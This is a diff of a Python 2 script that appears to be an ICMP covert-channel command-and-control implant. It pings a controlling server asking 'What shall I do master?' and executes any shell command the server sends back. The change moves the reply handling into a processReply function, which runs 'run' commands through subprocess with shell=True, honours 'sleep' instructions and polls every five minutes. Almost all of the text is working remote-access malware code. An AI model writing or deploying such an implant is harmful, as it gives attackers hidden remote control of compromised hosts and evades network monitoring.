@@ -19,8 +19,12 @@ def sendPingRequest(command):
 	return p
 
 def processReply(p):
-	response=p['Raw'].load
-        # Check ICMP data for 'run' command
+	try:
+		response=p['Raw'].load
+        except:
+		print "[X] Error: ", sys.exc_info()[0]
+		return
+	# Check ICMP data for 'run' command
         print "[*] String received from C2 server: " + p['Raw'].load
         if 'run' in response:
         	print "[*] Master says run command: " + response[4:]
@@ -50,31 +54,7 @@ def main(argv):
 			exit()
 		p=sendPingRequest("What shall I do master?")
 		if p:
-			#p.show()
-			try:
-				response=p['Raw'].load
-				# Check ICMP data for 'run' command
-				print "[*] String received from C2 server: " + p['Raw'].load
-				if 'run' in response:
-					print "[*] Master says run command: " + response[4:]
-					command = response[4:]
-					command.split()
-					proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
-       					output, errors = proc.communicate()
-        				print output
-        				print errors
-				elif 'sysinfo' in response:
-					print "[*] Master requesting sysinfo"
-				elif 'sleep' in response:
-					seconds = response[6:]
-					print "[*] Master says sleep for %s seconds" % (seconds)
-					print "[*] Sleeping..."
-					time.sleep(int(seconds))
-					p=sendPingRequest("What shall I do master?")
-					if p:
-						processReply(p)
-			except:
-				print "[X] ERROR: ", sys.exc_info()[0] 
+			processReply(p)
 		print "[*] Sleeping now..."
 		time.sleep(300)
 
